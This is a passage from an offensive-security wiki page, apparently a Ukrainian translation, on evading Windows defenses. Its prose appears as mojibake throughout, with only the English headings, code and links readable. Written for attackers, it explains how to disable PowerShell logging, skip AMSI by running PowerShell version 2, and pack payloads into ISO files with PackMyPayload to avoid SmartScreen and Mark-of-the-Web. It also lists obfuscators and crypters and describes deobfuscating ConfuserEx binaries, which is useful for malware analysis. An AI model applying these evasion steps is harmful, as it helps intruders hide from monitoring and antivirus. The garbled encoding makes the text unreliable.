PowerShell logging - —Ü–µ —Ñ—É–Ω–∫—Ü—ñ—è, —è–∫–∞ –¥–æ–∑–≤–æ–ª—è—î –≤–∞–º —Ä–µ—î—Å—Ç—Ä—É–≤–∞—Ç–∏ –≤—Å—ñ –∫–æ–º–∞–Ω–¥–∏ PowerShell, –≤–∏–∫–æ–Ω–∞–Ω—ñ –Ω–∞ —Å–∏—Å—Ç–µ–º—ñ. –¶–µ –º–æ–∂–µ –±—É—Ç–∏ –∫–æ—Ä–∏—Å–Ω–æ –¥–ª—è –∞—É–¥–∏—Ç—É —Ç–∞ —É—Å—É–Ω–µ–Ω–Ω—è –Ω–µ—Å–ø—Ä–∞–≤–Ω–æ—Å—Ç–µ–π, –∞–ª–µ —Ü–µ —Ç–∞–∫–æ–∂ –º–æ–∂–µ –±—É—Ç–∏ **–ø—Ä–æ–±–ª–µ–º–æ—é –¥–ª—è –∞—Ç–∞–∫—É—é—á–∏—Ö, —è–∫—ñ —Ö–æ—á—É—Ç—å —É–Ω–∏–∫–Ω—É—Ç–∏ –≤–∏—è–≤–ª–µ–Ω–Ω—è**.

–©–æ–± –æ–±—ñ–π—Ç–∏ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—é PowerShell, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω—ñ —Ç–µ—Ö–Ω—ñ–∫–∏:

- **–í–∏–º–∫–Ω–µ–Ω–Ω—è —Ç—Ä–∞–Ω—Å–∫—Ä–∏–ø—Ü—ñ—ó PowerShell —Ç–∞ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó –º–æ–¥—É–ª—ñ–≤**: –í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç, —Ç–∞–∫–∏–π —è–∫ [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) –¥–ª—è —Ü—ñ—î—ó –º–µ—Ç–∏.
- **–í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è PowerShell –≤–µ—Ä—Å—ñ—ó 2**: –Ø–∫—â–æ –≤–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç–µ PowerShell –≤–µ—Ä—Å—ñ—ó 2, AMSI –Ω–µ –±—É–¥–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–æ, —Ç–æ–º—É –≤–∏ –º–æ–∂–µ—Ç–µ –∑–∞–ø—É—Å–∫–∞—Ç–∏ —Å–≤–æ—ó —Å–∫—Ä–∏–ø—Ç–∏ –±–µ–∑ —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è AMSI. –í–∏ –º–æ–∂–µ—Ç–µ –∑—Ä–æ–±–∏—Ç–∏ —Ü–µ: `powershell.exe -version 2`
- **–í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è unmanaged PowerShell —Å–µ—Å—ñ—ó**: –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), —â–æ–± –∑–∞–ø—É—Å—Ç–∏—Ç–∏ PowerShell –±–µ–∑ –∑–∞—Ö–∏—Å—Ç—É (—Ü–µ —Ç–µ, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î `powerpick` –∑ Cobalt Strike).

## Obfuscation

> [!TIP]
> –ö—ñ–ª—å–∫–∞ —Ç–µ—Ö–Ω—ñ–∫ –æ–±—Ñ—É—Å–∫–∞—Ü—ñ—ó –ø–æ–∫–ª–∞–¥–∞—é—Ç—å—Å—è –Ω–∞ —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è –¥–∞–Ω–∏—Ö, —â–æ –∑–±—ñ–ª—å—à–∏—Ç—å –µ–Ω—Ç—Ä–æ–ø—ñ—é –±—ñ–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª—É, —â–æ –ø–æ–ª–µ–≥—à–∏—Ç—å –≤–∏—è–≤–ª–µ–Ω–Ω—è –π–æ–≥–æ –∞–Ω—Ç–∏–≤—ñ—Ä—É—Å–∞–º–∏ —Ç–∞ EDR. –ë—É–¥—å—Ç–µ –æ–±–µ—Ä–µ–∂–Ω—ñ –∑ —Ü–∏–º —ñ, –º–æ–∂–ª–∏–≤–æ, –∑–∞—Å—Ç–æ—Å–æ–≤—É–π—Ç–µ —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è –ª–∏—à–µ –¥–æ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏—Ö —á–∞—Å—Ç–∏–Ω –≤–∞—à–æ–≥–æ –∫–æ–¥—É, —è–∫—ñ —î —á—É—Ç–ª–∏–≤–∏–º–∏ –∞–±–æ –ø–æ—Ç—Ä–µ–±—É—é—Ç—å –ø—Ä–∏—Ö–æ–≤—É–≤–∞–Ω–Ω—è.

### Deobfuscating ConfuserEx-Protected .NET Binaries

–ü—Ä–∏ –∞–Ω–∞–ª—ñ–∑—ñ —à–∫—ñ–¥–ª–∏–≤–æ–≥–æ –ü–ó, —è–∫–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î ConfuserEx 2 (–∞–±–æ –∫–æ–º–µ—Ä—Ü—ñ–π–Ω—ñ —Ñ–æ—Ä–∫–∏), –∑–∞–∑–≤–∏—á–∞–π —Å—Ç–∏–∫–∞—é—Ç—å—Å—è –∑ –∫—ñ–ª—å–∫–æ–º–∞ —à–∞—Ä–∞–º–∏ –∑–∞—Ö–∏—Å—Ç—É, —è–∫—ñ –±–ª–æ–∫—É—é—Ç—å –¥–µ–∫–æ–º–ø—ñ–ª—è—Ç–æ—Ä–∏ —Ç–∞ –ø—ñ—Å–æ—á–Ω–∏—Ü—ñ. –ù–∞–≤–µ–¥–µ–Ω–∏–π –Ω–∏–∂—á–µ —Ä–æ–±–æ—á–∏–π –ø—Ä–æ—Ü–µ—Å –Ω–∞–¥—ñ–π–Ω–æ **–≤—ñ–¥–Ω–æ–≤–ª—é—î –º–∞–π–∂–µ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–∏–π IL**, —è–∫–∏–π –ø–æ—Ç—ñ–º –º–æ–∂–Ω–∞ –¥–µ–∫–æ–º–ø—ñ–ª—é–≤–∞—Ç–∏ –≤ C# –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ç–∞–∫–∏—Ö —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ñ–≤, —è–∫ dnSpy –∞–±–æ ILSpy.

1.  –í–∏–¥–∞–ª–µ–Ω–Ω—è –∞–Ω—Ç–∏–≤–∞–Ω–¥–∞–ª—å–Ω–æ–≥–æ –∑–∞—Ö–∏—Å—Ç—É ‚Äì ConfuserEx —à–∏—Ñ—Ä—É—î –∫–æ–∂–Ω–µ *—Ç—ñ–ª–æ –º–µ—Ç–æ–¥—É* —ñ —Ä–æ–∑—à–∏—Ñ—Ä–æ–≤—É—î –π–æ–≥–æ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Å—Ç–∞—Ç–∏—á–Ω–æ–≥–æ –∫–æ–Ω—Å—Ç—Ä—É–∫—Ç–æ—Ä–∞ *–º–æ–¥—É–ª—è* (`<Module>.cctor`). –¶–µ —Ç–∞–∫–æ–∂ –ø–∞—Ç—á—É—î PE –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—É —Å—É–º—É, —Ç–æ–º—É –±—É–¥—å-—è–∫–∞ –º–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ—è –ø—Ä–∏–∑–≤–µ–¥–µ –¥–æ –∑–±–æ—é –±—ñ–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª—É. –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ **AntiTamperKiller**, —â–æ–± –∑–Ω–∞–π—Ç–∏ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω—ñ —Ç–∞–±–ª–∏—Ü—ñ –º–µ—Ç–∞–¥–∞–Ω–∏—Ö, –≤—ñ–¥–Ω–æ–≤–∏—Ç–∏ –∫–ª—é—á—ñ XOR —ñ –ø–µ—Ä–µ–ø–∏—Å–∞—Ç–∏ —á–∏—Å—Ç—É –∑–±—ñ—Ä–∫—É:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
–í–∏—Ö—ñ–¥–Ω—ñ –¥–∞–Ω—ñ –º—ñ—Å—Ç—è—Ç—å 6 –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ–≤ –∞–Ω—Ç–∏–≤–∞–Ω–¥–∞–ª—å–Ω–æ–≥–æ –∑–∞—Ö–∏—Å—Ç—É (`key0-key3`, `nameHash`, `internKey`), —è–∫—ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –∫–æ—Ä–∏—Å–Ω–∏–º–∏ –ø—Ä–∏ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—ñ –≤–ª–∞—Å–Ω–æ–≥–æ —Ä–æ–∑–ø–∞–∫–æ–≤—É–≤–∞—á–∞.

2.  –í—ñ–¥–Ω–æ–≤–ª–µ–Ω–Ω—è —Å–∏–º–≤–æ–ª—ñ–≤ / –∫–æ–Ω—Ç—Ä–æ–ª—é –ø–æ—Ç–æ–∫—É ‚Äì –ø–æ–¥–∞–π—Ç–µ *—á–∏—Å—Ç–∏–π* —Ñ–∞–π–ª –¥–æ **de4dot-cex** (—Ñ–æ—Ä–∫ de4dot, —â–æ –ø—ñ–¥—Ç—Ä–∏–º—É—î ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
–ü–∞—Ä–∞–º–µ—Ç—Ä–∏:
‚Ä¢ `-p crx` ‚Äì –≤–∏–±—Ä–∞—Ç–∏ –ø—Ä–æ—Ñ—ñ–ª—å ConfuserEx 2
‚Ä¢ de4dot —Å–∫–∞—Å—É—î —Å–ø–ª—é—â–µ–Ω–Ω—è –∫–æ–Ω—Ç—Ä–æ–ª—é –ø–æ—Ç–æ–∫—É, –≤—ñ–¥–Ω–æ–≤–∏—Ç—å –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω—ñ –ø—Ä–æ—Å—Ç–æ—Ä–∏ —ñ–º–µ–Ω, –∫–ª–∞—Å–∏ —Ç–∞ —ñ–º–µ–Ω–∞ –∑–º—ñ–Ω–Ω–∏—Ö —ñ —Ä–æ–∑—à–∏—Ñ—Ä—É—î –∫–æ–Ω—Å—Ç–∞–Ω—Ç–Ω—ñ —Ä—è–¥–∫–∏.

3.  –í–∏–¥–∞–ª–µ–Ω–Ω—è –ø—Ä–æ–∫—Å—ñ-–≤–∏–∫–ª–∏–∫—ñ–≤ ‚Äì ConfuserEx –∑–∞–º—ñ–Ω—é—î –ø—Ä—è–º—ñ –≤–∏–∫–ª–∏–∫–∏ –º–µ—Ç–æ–¥—ñ–≤ –ª–µ–≥–∫–∏–º–∏ –æ–±–≥–æ—Ä—Ç–∫–∞–º–∏ (—Ç–∞–∫ –∑–≤–∞–Ω–∏–º–∏ *–ø—Ä–æ–∫—Å—ñ-–≤–∏–∫–ª–∏–∫–∞–º–∏*), —â–æ–± —â–µ –±—ñ–ª—å—à–µ —É—Å–∫–ª–∞–¥–Ω–∏—Ç–∏ –¥–µ–∫–æ–º–ø—ñ–ª—è—Ü—ñ—é. –í–∏–¥–∞–ª—ñ—Ç—å —ó—Ö –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
–ü—ñ—Å–ª—è —Ü—å–æ–≥–æ –∫—Ä–æ–∫—É –≤–∏ –ø–æ–≤–∏–Ω–Ω—ñ —Å–ø–æ—Å—Ç–µ—Ä—ñ–≥–∞—Ç–∏ –Ω–æ—Ä–º–∞–ª—å–Ω—ñ .NET API, —Ç–∞–∫—ñ —è–∫ `Convert.FromBase64String` –∞–±–æ `AES.Create()`, –∑–∞–º—ñ—Å—Ç—å –Ω–µ–ø—Ä–æ–∑–æ—Ä–∏—Ö —Ñ—É–Ω–∫—Ü—ñ–π-–æ–±–≥–æ—Ä—Ç–æ–∫ (`Class8.smethod_10`, ‚Ä¶).

4.  –†—É—á–Ω–µ –æ—á–∏—â–µ–Ω–Ω—è ‚Äì –∑–∞–ø—É—Å—Ç—ñ—Ç—å –æ—Ç—Ä–∏–º–∞–Ω–∏–π –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª –ø—ñ–¥ dnSpy, —à—É–∫–∞–π—Ç–µ –≤–µ–ª–∏–∫—ñ Base64 –±–ª–æ–±–∏ –∞–±–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è `RijndaelManaged`/`TripleDESCryptoServiceProvider`, —â–æ–± –∑–Ω–∞–π—Ç–∏ *—Ä–µ–∞–ª—å–Ω–∏–π* –∫–æ—Ä–∏—Å–Ω–∏–π –≤–∞–Ω—Ç–∞–∂. –ß–∞—Å—Ç–æ —à–∫—ñ–¥–ª–∏–≤–µ –ü–ó –∑–±–µ—Ä—ñ–≥–∞—î –π–æ–≥–æ —è–∫ –º–∞—Å–∏–≤ –±–∞–π—Ç—ñ–≤, –∑–∞–∫–æ–¥–æ–≤–∞–Ω–∏–π TLV, —ñ–Ω—ñ—Ü—ñ–∞–ª—ñ–∑–æ–≤–∞–Ω–∏–π –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ `<Module>.byte_0`.

–í–∏—â–µ–∑–≥–∞–¥–∞–Ω–∏–π –ª–∞–Ω—Ü—é–≥ –≤—ñ–¥–Ω–æ–≤–ª—é—î –ø–æ—Ç—ñ–∫ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è **–±–µ–∑** –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ—Å—Ç—ñ –∑–∞–ø—É—Å–∫–∞—Ç–∏ —à–∫—ñ–¥–ª–∏–≤–∏–π –∑—Ä–∞–∑–æ–∫ ‚Äì –∫–æ—Ä–∏—Å–Ω–æ –ø—Ä–∏ —Ä–æ–±–æ—Ç—ñ –Ω–∞ –æ—Ñ–ª–∞–π–Ω-—Ä–æ–±–æ—á—ñ–π —Å—Ç–∞–Ω—Ü—ñ—ó.

> üõà  ConfuserEx —Å—Ç–≤–æ—Ä—é—î –∫–æ—Ä–∏—Å—Ç—É–≤–∞—Ü—å–∫–∏–π –∞—Ç—Ä–∏–±—É—Ç –∑ –Ω–∞–∑–≤–æ—é `ConfusedByAttribute`, —è–∫–∏–π –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —è–∫ IOC –¥–ª—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ–≥–æ —Ç—Ä–∏–∞–∂—É –∑—Ä–∞–∑–∫—ñ–≤.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# –æ–±—Ñ—É—Å–∫–∞—Ç–æ—Ä**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): –ú–µ—Ç–æ—é —Ü—å–æ–≥–æ –ø—Ä–æ–µ–∫—Ç—É —î –Ω–∞–¥–∞–Ω–Ω—è –≤—ñ–¥–∫—Ä–∏—Ç–æ–≥–æ –∫–æ–¥—É —Ñ–æ—Ä–∫—É [LLVM](http://www.llvm.org/) –∫–æ–º–ø—ñ–ª—è—Ü—ñ–π–Ω–æ–≥–æ –ø–∞–∫–µ—Ç—É, –∑–¥–∞—Ç–Ω–æ–≥–æ –∑–∞–±–µ–∑–ø–µ—á–∏—Ç–∏ –ø—ñ–¥–≤–∏—â–µ–Ω—É –±–µ–∑–ø–µ–∫—É –ø—Ä–æ–≥—Ä–∞–º–Ω–æ–≥–æ –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è —á–µ—Ä–µ–∑ [–æ–±—Ñ—É—Å–∫–∞—Ü—ñ—é –∫–æ–¥—É](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) —Ç–∞ –∑–∞—Ö–∏—Å—Ç –≤—ñ–¥ –ø—ñ–¥—Ä–æ–±–∫–∏.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator –¥–µ–º–æ–Ω—Å—Ç—Ä—É—î, —è–∫ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –º–æ–≤—É `C++11/14` –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó, –ø—ñ–¥ —á–∞—Å –∫–æ–º–ø—ñ–ª—è—Ü—ñ—ó, –æ–±—Ñ—É—Å—Ü–∏—Ä–æ–≤–∞–Ω–æ–≥–æ –∫–æ–¥—É –±–µ–∑ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –±—É–¥—å-—è–∫–æ–≥–æ –∑–æ–≤–Ω—ñ—à–Ω—å–æ–≥–æ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—É —Ç–∞ –±–µ–∑ –º–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –∫–æ–º–ø—ñ–ª—è—Ç–æ—Ä–∞.
- [**obfy**](https://github.com/fritzone/obfy): –î–æ–¥–∞—î —à–∞—Ä –æ–±—Ñ—É—Å—Ü–∏—Ä–æ–≤–∞–Ω–∏—Ö –æ–ø–µ—Ä–∞—Ü—ñ–π, –∑–≥–µ–Ω–µ—Ä–æ–≤–∞–Ω–∏—Ö –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é C++ —à–∞–±–ª–æ–Ω–Ω–æ–≥–æ –º–µ—Ç–∞–ø—Ä–æ–≥—Ä–∞–º—É–≤–∞–Ω–Ω—è, —â–æ —É—Å–∫–ª–∞–¥–Ω–∏—Ç—å –∂–∏—Ç—Ç—è –ª—é–¥–∏–Ω—ñ, —è–∫–∞ —Ö–æ—á–µ –∑–ª–∞–º–∞—Ç–∏ –¥–æ–¥–∞—Ç–æ–∫.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz - —Ü–µ x64 –æ–±—Ñ—É—Å–∫–∞—Ç–æ—Ä –±—ñ–Ω–∞—Ä–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤, –∑–¥–∞—Ç–Ω–∏–π –æ–±—Ñ—É—Å–∫—É–≤–∞—Ç–∏ —Ä—ñ–∑–Ω—ñ —Ñ–∞–π–ª–∏ pe, –≤–∫–ª—é—á–∞—é—á–∏: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame - —Ü–µ –ø—Ä–æ—Å—Ç–∏–π –º–µ—Ç–∞–º–æ—Ä—Ñ–Ω–∏–π –∫–æ–¥–æ–≤–∏–π –¥–≤–∏–≥—É–Ω –¥–ª—è –¥–æ–≤—ñ–ª—å–Ω–∏—Ö –≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator - —Ü–µ –¥–µ—Ç–∞–ª—å–Ω–∏–π —Ñ—Ä–µ–π–º–≤–æ—Ä–∫ –æ–±—Ñ—É—Å–∫–∞—Ü—ñ—ó –∫–æ–¥—É –¥–ª—è –º–æ–≤, —â–æ –ø—ñ–¥—Ç—Ä–∏–º—É—é—Ç—å LLVM, –∑ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è–º ROP (–ø—Ä–æ–≥—Ä–∞–º—É–≤–∞–Ω–Ω—è, –æ—Ä—ñ—î–Ω—Ç–æ–≤–∞–Ω–æ–≥–æ –Ω–∞ –ø–æ–≤–µ—Ä–Ω–µ–Ω–Ω—è). ROPfuscator –æ–±—Ñ—É—Å–∫—É—î –ø—Ä–æ–≥—Ä–∞–º—É –Ω–∞ —Ä—ñ–≤–Ω—ñ –∞—Å–µ–º–±–ª–µ—Ä–Ω–æ–≥–æ –∫–æ–¥—É, –ø–µ—Ä–µ—Ç–≤–æ—Ä—é—é—á–∏ –∑–≤–∏—á–∞–π–Ω—ñ —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—ó –Ω–∞ ROP-–ª–∞–Ω—Ü—é–≥–∏, —â–æ –∑–∞–≤–∞–∂–∞—î –Ω–∞—à–æ–º—É –ø—Ä–∏—Ä–æ–¥–Ω–æ–º—É —Å–ø—Ä–∏–π–Ω—è—Ç—Ç—é –Ω–æ—Ä–º–∞–ª—å–Ω–æ–≥–æ –∫–æ–Ω—Ç—Ä–æ–ª—é –ø–æ—Ç–æ–∫—É.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt - —Ü–µ .NET PE Crypter, –Ω–∞–ø–∏—Å–∞–Ω–∏–π –Ω–∞ Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor –∑–¥–∞—Ç–Ω–∏–π –ø–µ—Ä–µ—Ç–≤–æ—Ä—é–≤–∞—Ç–∏ —ñ—Å–Ω—É—é—á—ñ EXE/DLL —É shellcode, –∞ –ø–æ—Ç—ñ–º –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏ —ó—Ö

## SmartScreen & MoTW

–í–∏, –º–æ–∂–ª–∏–≤–æ, –±–∞—á–∏–ª–∏ —Ü–µ–π –µ–∫—Ä–∞–Ω, –∫–æ–ª–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞–ª–∏ –¥–µ—è–∫—ñ –≤–∏–∫–æ–Ω—É–≤–∞–Ω—ñ —Ñ–∞–π–ª–∏ –∑ –Ü–Ω—Ç–µ—Ä–Ω–µ—Ç—É —Ç–∞ –≤–∏–∫–æ–Ω—É–≤–∞–ª–∏ —ó—Ö.

Microsoft Defender SmartScreen - —Ü–µ –º–µ—Ö–∞–Ω—ñ–∑–º –±–µ–∑–ø–µ–∫–∏, –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∏–π –¥–ª—è –∑–∞—Ö–∏—Å—Ç—É –∫—ñ–Ω—Ü–µ–≤–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –≤—ñ–¥ –∑–∞–ø—É—Å–∫—É –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ —à–∫—ñ–¥–ª–∏–≤–∏—Ö –¥–æ–¥–∞—Ç–∫—ñ–≤.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É –ø—Ä–∞—Ü—é—î –Ω–∞ –æ—Å–Ω–æ–≤—ñ —Ä–µ–ø—É—Ç–∞—Ü—ñ—ó, —â–æ –æ–∑–Ω–∞—á–∞—î, —â–æ –Ω–µ–∑–≤–∏—á–∞–π–Ω–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω—ñ –ø—Ä–æ–≥—Ä–∞–º–∏ –∞–∫—Ç–∏–≤—É—é—Ç—å SmartScreen, —Ç–∏–º —Å–∞–º–∏–º –ø–æ–ø–µ—Ä–µ–¥–∂–∞—é—á–∏ —Ç–∞ –∑–∞–≤–∞–∂–∞—é—á–∏ –∫—ñ–Ω—Ü–µ–≤–æ–º—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—É –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ —Ñ–∞–π–ª (—Ö–æ—á–∞ —Ñ–∞–π–ª –≤—Å–µ —â–µ –º–æ–∂–Ω–∞ –≤–∏–∫–æ–Ω–∞—Ç–∏, –Ω–∞—Ç–∏—Å–Ω—É–≤—à–∏ –ë—ñ–ª—å—à–µ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó -> –ó–∞–ø—É—Å—Ç–∏—Ç–∏ –≤—Å–µ –∂).

**MoTW** (–ú—ñ—Ç–∫–∞ –≤–µ–±—É) - —Ü–µ [NTFS –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω–∏–π –ø–æ—Ç—ñ–∫ –¥–∞–Ω–∏—Ö](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) –∑ –Ω–∞–∑–≤–æ—é Zone.Identifier, —è–∫–∏–π –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ —Å—Ç–≤–æ—Ä—é—î—Ç—å—Å—è –ø—ñ–¥ —á–∞—Å –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤ –∑ –Ü–Ω—Ç–µ—Ä–Ω–µ—Ç—É, —Ä–∞–∑–æ–º –∑ URL-–∞–¥—Ä–µ—Å–æ—é, –∑ —è–∫–æ—ó –≤—ñ–Ω –±—É–≤ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–∏–π.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>–ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ Zone.Identifier ADS –¥–ª—è —Ñ–∞–π–ª—É, –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–æ–≥–æ –∑ –Ü–Ω—Ç–µ—Ä–Ω–µ—Ç—É.</p></figcaption></figure>

> [!TIP]
> –í–∞–∂–ª–∏–≤–æ –∑–∞–∑–Ω–∞—á–∏—Ç–∏, —â–æ –≤–∏–∫–æ–Ω—É–≤–∞–Ω—ñ —Ñ–∞–π–ª–∏, –ø—ñ–¥–ø–∏—Å–∞–Ω—ñ **–¥–æ—Å—Ç–æ–≤—ñ—Ä–Ω–∏–º** —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–æ–º –ø—ñ–¥–ø–∏—Å—É, **–Ω–µ –∞–∫—Ç–∏–≤—É—é—Ç—å SmartScreen**.

–î—É–∂–µ –µ—Ñ–µ–∫—Ç–∏–≤–Ω–∏–π —Å–ø–æ—Å—ñ–± –∑–∞–ø–æ–±—ñ–≥—Ç–∏ —Ç–æ–º—É, —â–æ–± –≤–∞—à—ñ –∫–æ—Ä–∏—Å–Ω—ñ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –æ—Ç—Ä–∏–º–∞–ª–∏ –ú—ñ—Ç–∫—É –≤–µ–±—É, - —Ü–µ —É–ø–∞–∫—É–≤–∞—Ç–∏ —ó—Ö —É —è–∫–∏–π—Å—å –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, ISO. –¶–µ –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è —Ç–æ–º—É, —â–æ –ú—ñ—Ç–∫–∞ –≤–µ–±—É (MOTW) **–Ω–µ –º–æ–∂–µ** –±—É—Ç–∏ –∑–∞—Å—Ç–æ—Å–æ–≤–∞–Ω–∞ –¥–æ **–Ω–µ NTFS** —Ç–æ–º—ñ–≤.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) - —Ü–µ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç, —è–∫–∏–π —É–ø–∞–∫—É—î –∫–æ—Ä–∏—Å–Ω—ñ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –≤ –≤–∏—Ö—ñ–¥–Ω—ñ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∏, —â–æ–± —É–Ω–∏–∫–Ω—É—Ç–∏ –ú—ñ—Ç–∫–∏ –≤–µ–±—É.

–ü—Ä–∏–∫–ª–∞–¥ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
–û—Å—å –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü—ñ—è –æ–±—Ö–æ–¥—É SmartScreen —à–ª—è—Ö–æ–º —É–ø–∞–∫–æ–≤–∫–∏ payload —É —Ñ–∞–π–ª–∏ ISO –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

